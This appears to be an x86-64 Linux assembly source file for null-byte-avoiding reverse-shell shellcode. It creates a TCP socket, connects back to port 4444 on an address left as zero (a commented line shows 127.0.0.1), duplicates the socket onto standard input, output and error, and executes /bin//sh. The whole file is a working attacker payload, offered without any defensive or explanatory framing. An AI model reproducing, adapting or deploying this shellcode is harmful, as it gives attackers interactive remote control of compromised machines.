;
global _start


_start:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

;        xor rax, rax
 ;       add al, 41
	push byte 41
	pop rax

        ;xor rdi, rdi
       ; add di, 2
	push byte 2
	pop rdi
	
;        xor rsi, rsi
 ;       add si,1
	push byte 1
	pop rsi
        xor rdx, rdx
        syscall

        ; copy socket descriptor to rdi for future use
        mov rdi, rax


        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
        ; bzero(&server.sin_zero, 8)

        xor rax, rax

        push rax

        mov dword [rsp-4], eax
;       mov dword [rsp-4], 0x0100007f                   ; leaving this alone
        mov word [rsp-6], 0x5c11

        mov word [rsp-8], -1
        add word [rsp-8], 3
;:      mov word [rsp-8], 0x2
        sub rsp, 8
        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)

;        xor rax, rax
 ;       add al, 42
	push byte 42
	pop rax
        mov rsi, rsp

;        xor rdx, rdx
 ;       add dl, 16
	push byte 16
	pop rdx
        syscall


        ; duplicate sockets

        ; dup2 (new, old)

;        xor rax, rax
 ;       add al, 33
	push byte 33
	pop rax
        ;:mov rax, 33
        xor rsi, rsi
;        mov rsi, 0
        syscall

        xor rax,rax
        add al, 33
;        mov rax, 33
;        xor rsi, rsi
 ;       add si, 1
	push byte 1
	pop rsi
;        mov rsi, 1
        syscall

;        xor rax, rax
 ;       mov al, 33
	push byte 33
	pop rax
;        mov rax, 33
;        xor rsi, rsi
 ;       add si, 2
	push byte 2
	pop rsi
        ;mov rsi, 2
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

